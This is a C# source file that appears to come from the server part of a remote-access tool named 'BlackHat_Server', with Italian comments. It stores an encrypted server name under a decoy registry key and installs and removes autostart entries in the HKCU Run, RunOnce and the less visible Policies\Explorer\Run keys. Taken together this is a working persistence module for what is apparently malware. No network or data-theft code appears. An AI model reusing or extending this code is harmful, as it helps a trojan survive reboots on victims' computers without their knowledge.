using System;
using Microsoft.Win32;

namespace BlackHat_Server.Class
{
    internal class RegistryManager
    {
        #region SERVER NAME

        /// <summary>
        ///     Controlla se esiste il ket sul registro del
        ///     nome server
        /// </summary>
        /// <returns></returns>
        public bool ExistServerNameEntry()
        {
            try
            {
                var rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");

                if (rk_Check == null)
                    return false;
                return true;
            }
            catch
            {
                return false;
            }
        }
        //-------------------------------------------------------

        /// <summary>
        ///     Setta il nuovo valore sul registro
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool SetNewNameInRegistry(string newNameCrypted)
        {
            try
            {
                // CONTROLLO ESISTENZA DELLA CHIAVE
                var rk_Check = Registry.CurrentUser.CreateSubKey(@"Software\Live\Current User");


                rk_Check.SetValue("User", newNameCrypted, RegistryValueKind.ExpandString);

                rk_Check.Close();

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------

        /// <summary>
        ///     Get il nome dal registro
        ///     null se non esiste o errore
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public string GetNameFromRegistry()
        {
            try
            {
                // CONTROLLO ESISTENZA DELLA CHIAVE
                var rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");

                if (rk_Check == null)
                    return null;
                return rk_Check.GetValue("User").ToString();
            }
            catch
            {
                return null;
            }
        }
        //---------------------------------------------------------

        #endregion

        #region INSTALLATION

        /// <summary>
        ///     HKCU RUNONCE ENTRY
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool AddHKCURunOnceReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey StartupPath;
                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);

                // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
                if (StartupPath.GetValue(regEntryName) == null ||
                    StartupPath.GetValue(regEntryName).ToString() != filePath)
                    StartupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------

        /// <summary>
        ///     HKCU ENTRY
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool AddHKCUReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey StartupPath;
                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

                // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
                if (StartupPath.GetValue(regEntryName) == null ||
                    StartupPath.GetValue(regEntryName).ToString() != filePath)
                    StartupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------


        /// <summary>
        ///     Explorer ENTRY
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public bool AddExplorerReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run");

                // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
                if (rk.GetValue(regEntryName) == null || rk.GetValue(regEntryName).ToString() != filePath)
                    rk.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);

                return true;
            }
            catch
            {
                return false;
            }
        }
        //---------------------------------------------------------

        #endregion

        #region UNINSTALL

        /// <summary>
        ///     HKCU ENTRY DELETE
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public void RemoveHKCUReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey StartupPath;
                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

                // LOELIMINO SOLO SE è PUNTA A ME
                if (StartupPath.GetValue(regEntryName).ToString() == filePath)
                    StartupPath.DeleteValue(regEntryName);
            }
            catch (Exception ex)
            {
                var exc = ex.Message;
            }
        }
        //---------------------------------------------------------


        /// <summary>
        ///     Explorer ENTRY DELETE
        /// </summary>
        /// <param name="regEntryName"></param>
        /// <param name="filePath"></param>
        public void RemoveExplorerReg(string regEntryName, string filePath)
        {
            try
            {
                var rk = Registry.CurrentUser;
                RegistryKey StartupPath;
                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);


                if (StartupPath.GetValue(regEntryName).ToString() == filePath)
                    StartupPath.DeleteValue(regEntryName);
            }
            catch (Exception ex)
            {
                var exc = ex.Message;
            }
        }
        //---------------------------------------------------------

        #endregion
    }
}